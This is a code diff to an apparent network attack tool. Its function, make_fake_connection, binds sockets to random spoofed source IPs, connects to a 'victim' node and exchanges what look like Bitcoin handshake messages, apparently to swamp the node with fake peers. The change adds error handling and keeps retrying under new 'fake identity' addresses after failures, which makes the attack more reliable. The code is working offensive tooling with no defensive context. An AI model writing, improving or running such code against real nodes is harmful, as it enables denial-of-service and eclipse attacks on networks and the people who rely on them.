@@ -182,21 +182,32 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 	if verbose: print('Creating network socket...')
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
-	success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
-	while success == -1:
-		print(f'Setting socket network interface to "{network_interface}"...')
+	try:
+		if verbose: print(f'Setting socket network interface to "{network_interface}"...')
 		success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
+		while success == -1:
+			print(f'Setting socket network interface to "{network_interface}"...')
+			success = s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
 
-	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
-	s.bind((src_ip, src_port))
+		if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
+		s.bind((src_ip, src_port))
+	except:
+		print('Failed to bind ip to victim')
+		close_connection(s, None, src_ip, src_port, interface)
+		time.sleep(1)
+		rand_ip = random_ip()
+		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
+		return
 
 	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
 	try:
 		s.connect((dst_ip, dst_port))
 	except:
+		print('Failed to connect to victim')
 		close_connection(s, None, src_ip, src_port, interface)
-		make_fake_connection(random_ip(), dst_ip, False, attempt_number - 1)
+		time.sleep(1)
+		rand_ip = random_ip()
+		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 		return
 
 	try:
@@ -211,9 +222,10 @@ def make_fake_connection(src_ip, dst_ip, verbose=True, attempt_number = 0):
 		# Get verack packet
 		verack = s.recv(1024)
 	except:
-		print('Failed to connect')
+		print('Failed to send packets to victim')
 		close_connection(s, None, src_ip, src_port, interface)
-		make_fake_connection(random_ip(), dst_ip, False, attempt_number - 1)
+		rand_ip = random_ip()
+		create_task('Creating fake identity: ' + rand_ip, make_fake_connection, rand_ip, dst_ip, False, attempt_number - 1)
 
 	if verbose: print('Connection successful!')
 
